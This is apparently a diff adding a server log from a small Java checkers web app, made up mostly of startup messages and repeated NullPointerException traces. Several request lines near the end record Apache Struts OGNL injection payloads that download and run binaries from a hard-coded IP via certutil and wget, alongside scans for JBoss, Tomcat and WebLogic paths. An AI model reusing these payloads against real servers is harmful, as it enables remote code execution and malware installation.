@@ -1,0 +1,641 @@
+WARNING: An illegal reflective access operation has occurred
+WARNING: Illegal reflective access by com.google.inject.internal.cglib.core.$ReflectUtils$1 (file:/usr/share/maven/lib/guice.jar) to method java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain)
+WARNING: Please consider reporting this to the maintainers of com.google.inject.internal.cglib.core.$ReflectUtils$1
+WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
+WARNING: All illegal access operations will be denied in a future release
+[[1;34mINFO[m] Scanning for projects...
+[[1;34mINFO[m] 
+[[1;34mINFO[m] [1m------------------------------------------------------------------------[m
+[[1;34mINFO[m] [1mBuilding Web Checkers a'la Spark/Java8 1.0-SNAPSHOT[m
+[[1;34mINFO[m] [1m------------------------------------------------------------------------[m
+[[1;34mINFO[m] 
+[[1;34mINFO[m] [1m--- [0;32mexec-maven-plugin:1.6.0:java[m [1m(default-cli)[m @ [36mcheckers-app[0;1m ---[m
+2018-11-17 16:05:23.069 CONFIG  [com.webcheckers.Application] WebCheckers is initializing. 
+[com.webcheckers.Application.main()] INFO spark.staticfiles.StaticFilesConfiguration - StaticResourceHandler configured with folder = /public
+2018-11-17 16:05:23.234 CONFIG  [com.webcheckers.ui.GetHomeRoute] GetHomeRoute is initialized. 
+2018-11-17 16:05:23.255 CONFIG  [com.webcheckers.ui.GetSignInRoute] SigninRoute is initialized. 
+2018-11-17 16:05:23.261 CONFIG  [com.webcheckers.ui.GetGameRoute] GetGameRoute is initialized. 
+2018-11-17 16:05:23.270 CONFIG  [com.webcheckers.ui.WebServer] WebServer is initialized. 
+2018-11-17 16:05:23.280 CONFIG  [com.webcheckers.Application] WebCheckers initialization complete. 
+[Thread-0] INFO org.eclipse.jetty.util.log - Logging initialized @6906ms to org.eclipse.jetty.util.log.Slf4jLog
+[Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - == Spark has ignited ...
+[Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - >> Listening on 0.0.0.0:4567
+[Thread-0] INFO org.eclipse.jetty.server.Server - jetty-9.4.8.v20171121, build timestamp: 2017-11-21T21:27:37Z, git hash: 82b8fb23f757335bb3329d540ce37a2a2615f0a8
+[Thread-0] INFO org.eclipse.jetty.server.session - DefaultSessionIdManager workerName=node0
+[Thread-0] INFO org.eclipse.jetty.server.session - No SessionScavenger set, using defaults
+[Thread-0] INFO org.eclipse.jetty.server.session - Scavenging every 660000ms
+[Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@43c89811{HTTP/1.1,[http/1.1]}{0.0.0.0:4567}
+[Thread-0] INFO org.eclipse.jetty.server.Server - Started @7135ms
+WARNING: An illegal reflective access operation has occurred
+WARNING: Illegal reflective access by com.google.inject.internal.cglib.core.$ReflectUtils$1 (file:/usr/share/maven/lib/guice.jar) to method java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain)
+WARNING: Please consider reporting this to the maintainers of com.google.inject.internal.cglib.core.$ReflectUtils$1
+WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
+WARNING: All illegal access operations will be denied in a future release
+[[1;34mINFO[m] Scanning for projects...
+[[1;34mINFO[m] 
+[[1;34mINFO[m] [1m------------------------------------------------------------------------[m
+[[1;34mINFO[m] [1mBuilding Web Checkers a'la Spark/Java8 1.0-SNAPSHOT[m
+[[1;34mINFO[m] [1m------------------------------------------------------------------------[m
+[[1;34mINFO[m] 
+[[1;34mINFO[m] [1m--- [0;32mexec-maven-plugin:1.6.0:java[m [1m(default-cli)[m @ [36mcheckers-app[0;1m ---[m
+2018-11-17 16:07:39.082 CONFIG  [com.webcheckers.Application] WebCheckers is initializing. 
+[com.webcheckers.Application.main()] INFO spark.staticfiles.StaticFilesConfiguration - StaticResourceHandler configured with folder = /public
+2018-11-17 16:07:39.219 CONFIG  [com.webcheckers.ui.GetHomeRoute] GetHomeRoute is initialized. 
+2018-11-17 16:07:39.235 CONFIG  [com.webcheckers.ui.GetSignInRoute] SigninRoute is initialized. 
+2018-11-17 16:07:39.241 CONFIG  [com.webcheckers.ui.GetGameRoute] GetGameRoute is initialized. 
+2018-11-17 16:07:39.260 CONFIG  [com.webcheckers.ui.WebServer] WebServer is initialized. 
+2018-11-17 16:07:39.264 CONFIG  [com.webcheckers.Application] WebCheckers initialization complete. 
+[Thread-0] INFO org.eclipse.jetty.util.log - Logging initialized @6777ms to org.eclipse.jetty.util.log.Slf4jLog
+[Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - == Spark has ignited ...
+[Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - >> Listening on 0.0.0.0:4567
+[Thread-0] INFO org.eclipse.jetty.server.Server - jetty-9.4.8.v20171121, build timestamp: 2017-11-21T21:27:37Z, git hash: 82b8fb23f757335bb3329d540ce37a2a2615f0a8
+[Thread-0] INFO org.eclipse.jetty.server.session - DefaultSessionIdManager workerName=node0
+[Thread-0] INFO org.eclipse.jetty.server.session - No SessionScavenger set, using defaults
+[Thread-0] INFO org.eclipse.jetty.server.session - Scavenging every 660000ms
+[Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@7494e8a2{HTTP/1.1,[http/1.1]}{0.0.0.0:4567}
+[Thread-0] INFO org.eclipse.jetty.server.Server - Started @7021ms
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/ws_utc/resources/setting/options/general] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-17] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-19] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-13] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-15] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-20] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-13] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-13] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-13] INFO spark.http.matching.MatcherFilter - The requested route [/invoker/readonly] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/invoker/JMXInvokerServlet] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-17] INFO spark.http.matching.MatcherFilter - The requested route [/jmx-console/HtmlAdaptor] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/orders.xhtml] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-17] INFO spark.http.matching.MatcherFilter - The requested route [/users] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-19] INFO spark.http.matching.MatcherFilter - The requested route [/dba_put1.jsp/] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/dba_put1.jsp] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/manager/html] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-17] INFO spark.http.matching.MatcherFilter - The requested route [/wls-wsat/CoordinatorPortType] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-19] INFO spark.http.matching.MatcherFilter - The requested route [/ws_utc/resources/setting/options/general] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-15] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-13] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-16] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-16] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-13] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-13] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-13] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
